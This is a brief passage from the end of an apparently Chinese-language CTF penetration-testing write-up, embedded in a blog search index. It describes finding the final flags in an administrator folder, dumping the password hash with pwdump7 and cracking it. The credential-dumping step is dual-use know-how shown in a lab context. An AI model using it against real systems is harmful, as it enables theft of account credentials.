<p>在管理员的文件夹中找到最后两个flag，其中一个加密。应该是要管理员密码。使用pwdump7找到密码的hash，解出hash。</p>
<p>打完收工。</p>
]]></content>
      
        
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 渗透 </tag>
            
        </tags>
        
    </entry>
    
  
  
</search>
